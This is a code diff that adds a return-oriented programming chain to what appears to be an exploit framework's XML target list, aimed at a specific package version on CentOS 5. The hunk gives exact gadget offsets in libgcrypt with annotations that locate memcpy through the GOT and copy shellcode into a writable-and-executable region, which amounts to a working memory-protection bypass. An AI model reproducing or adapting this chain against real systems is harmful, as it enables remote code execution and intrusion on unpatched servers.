@@ -260,7 +260,51 @@
 
     </rop>
 
+    <rop>
+        <compatibility>
+            <target>3.5.10-0.107.el5 on CentOS 5</target>
+        </compatibility>
 
+        <!--
+        yum list |grep libgcrypt
+        libgcrypt.i386                           1.4.4-5.el5                   installed
+        02c63000-02ce1000 r-xp 00000000 fd:00 929390     /usr/lib/libgcrypt.so.11.5.2
+        02ce1000-02ce4000 rwxp 0007d000 fd:00 929390     /usr/lib/libgcrypt.so.11.5.2
+        section is writable and executable, we'll copy the shellcode over there instead of using mmap
+        -->
+
+        <gadgets base="0">
+                <gadget offset="0x00004277">pop esi ; pop ebp ; ret</gadget>
+                <gadget offset="0x0005e842">pop eax ; pop ebx ; pop esi ; pop edi ; ret || eax = ret eip from call esi, ebx = esp, esi = edi = junk</gadget>
+                <gadget value ="0x00000000">ebp = junk to be skipped over</gadget>
+                <gadget offset="0x00028374">push esp ; and al, 0x08 ; mov dword [esp+0x04], 0x00000007 ; call esi</gadget>
+                <gadget value ="0x00000000">esi = junk to be skipped over</gadget>
+                <gadget value ="0x00000000">edi = junk to be skipped over</gadget>
+                <gadget offset="0x00062c29">xchg eax, ebx ; ret || eax = esp</gadget>
+                <gadget offset="0x0006299c">pop ecx ; ret</gadget>
+                <gadget value ="0x0000005c">value to add to esp to point to shellcode</gadget>
+                <gadget offset="0x0005a44d">add ecx, eax ; mov eax, ecx ; ret || eax = ecx = shellcode</gadget>
+                <gadget offset="0x0006f5a1">pop edx ; inc ebx ; ret || set edx = to dst in memcpy for ret after pushad</gadget>
+                <gadget offset="0x00080800">offset of writable/executable memory (last 0x800 bytes)</gadget>
+                <gadget offset="0x0006a73f">pop eax ; ret</gadget>
+                <gadget offset="0x0007effc">memcpy@got - 4</gadget>
+                <gadget offset="0x00015e47">mov eax, dword [eax+0x04] ; ret || eax = @memcpy</gadget>
+                <gadget offset="0x00062c29">xchg eax, ebx ; ret || ebx = @memcpy</gadget>
+                <gadget offset="0x0001704e">mov eax, ecx ; ret || eax = ecx = src in memcpy</gadget>
+                <gadget offset="0x00004277">pop esi ; pop ebp ; ret</gadget>
+                <gadget offset="0x0007ef54">esi = offset of .got.plt section</gadget>
+                <gadget value ="0x00000000">ebp = junk to be skipped over</gadget>
+                <gadget offset="0x0006299c">pop ecx ; ret</gadget>
+                <gadget offset="0x00080800">offset of writable/executable memory (last 0x800 bytes)</gadget>
+                <gadget offset="0x00007a2b">pop edi ; pop ebp ** 1 **; ret</gadget>
+                <gadget offset="0x00004276">(P) pop ebx ; pop esi ; pop ebp ; ret</gadget>
+                <gadget value ="0x00000000">junk for ebp **1**</gadget>
+                <gadget offset="0x0006200a">pushad ; ret</gadget>
+                <gadget value ="size">payload size</gadget>
+        </gadgets>
+
+
+    </rop>
 
 
 
